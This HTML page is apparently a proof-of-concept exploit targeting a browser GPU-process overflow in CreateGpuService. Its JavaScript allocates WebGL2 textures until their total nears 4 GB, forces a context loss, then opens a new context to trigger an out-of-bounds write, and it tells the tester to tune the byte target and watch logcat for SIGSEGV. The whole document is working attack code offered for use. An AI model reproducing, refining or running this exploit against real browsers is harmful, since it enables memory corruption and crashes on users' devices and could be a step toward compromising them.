<!DOCTYPE html>
<html>
<body>
<h1>CreateGpuService Overflow – Final</h1>
<pre id="log"></pre>
<script>
// CHANGE THIS: 0xFFFFFFF5 is ideal, but start with a lower value and increase
const TARGET_BYTES = 0xFFFF0000; // try 0xFFFF0000, 0xFFFFFF00, 0xFFFFFFA0, etc.

(async function() {
  const log = (msg) => { document.getElementById('log').textContent += msg + '\n'; };

  const canvas = new OffscreenCanvas(256, 256);
  const gl = canvas.getContext('webgl2', { powerPreference: 'high-performance' });
  if (!gl) return log('WebGL2 not supported');

  const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
  // Use 4096x4096 (64 MB) to quickly reach high totals
  const texSize = Math.min(4096, maxSize);
  const bytesPerTex = texSize * texSize * 4;
  log(`Texture size: ${texSize}x${texSize}, bytes: ${bytesPerTex}`);

  let totalBytes = 0;
  const textures = [];

  // Allocate textures until totalBytes >= TARGET_BYTES
  while (totalBytes < TARGET_BYTES) {
    const tex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, tex);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, texSize, texSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
    textures.push(tex);
    totalBytes += bytesPerTex;
    if (textures.length % 10 === 0) {
      log(`Allocated ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);
    }
  }
  log(`Reached target: ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);

  // Force GPU process restart (context loss)
  const loseExt = gl.getExtension('WEBGL_lose_context');
  if (loseExt) {
    loseExt.loseContext();
    log('Context lost, waiting for GPU process restart...');
  }

  // After a short delay, try to create a new context.
  // The new GPU process will request the total memory from the browser,
  // which will overflow and allocate a tiny shared memory region.
  setTimeout(async () => {
    log('Creating new context...');
    try {
      const newCanvas = new OffscreenCanvas(1, 1);
      const newGl = newCanvas.getContext('webgl2', { powerPreference: 'high-performance' });
      if (newGl) {
        // Immediately allocate a texture to force the GPU process to use
        // the (now tiny) shared memory, triggering an overflow write.
        const tex = newGl.createTexture();
        newGl.bindTexture(newGl.TEXTURE_2D, tex);
        newGl.texImage2D(newGl.TEXTURE_2D, 0, newGl.RGBA, 1, 1, 0, newGl.RGBA, newGl.UNSIGNED_BYTE, null);
        log('Texture allocated in new context – check logcat for SIGSEGV!');
      } else {
        log('New context creation failed – may have crashed already.');
      }
    } catch(e) {
      log('Error during new context: ' + e.message);
    }
  }, 3000);
})();
</script>
</body>
</html>
